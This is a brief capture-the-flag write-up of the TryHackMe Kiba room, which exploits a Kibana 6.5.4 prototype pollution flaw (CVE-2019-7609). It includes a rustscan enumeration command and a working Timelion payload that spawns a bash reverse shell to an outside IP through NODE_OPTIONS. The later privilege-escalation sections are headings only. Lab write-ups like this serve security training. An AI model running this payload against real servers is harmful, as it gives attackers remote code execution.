# WriteUp of Kiba Room from TryHackMe

##	What is the vulnerability that is specific to programming languages with prototype-based inheritance?
Prototype Pollution

## What is the version of visualization dashboard installed in the server?
We will start our enumeration with rustscan
```
rustscan <IP> -u 5000
```
output
```
Open 10.10.93.74:80
Open 10.10.93.74:22
Open 10.10.93.74:5601
```
So 5601 is port for kibana so we can go to the webpage and check for the version of kibana by search in the source code.
So the version is 6.5.4

## What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
CVE-2019-7609


## Compromise the machine and locate user.txt
Payload for the exploit
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
Steps:-
```
We have a prototype pollution in Timelion.
After clicking "Canvas", Kibana spawns a new process.
We can control the environmental variables passed to the new node process.
We can execute arbitrary JavaScript code if we control environmental variables to the new node process.
This leads to RCE in Kibana < 6.6.0.
```

## Capabilities is a concept that provides a security system that allows "divide" root privileges into different values

## How would you recursively list all of these capabilities?

## Escalate privileges and obtain root.txt

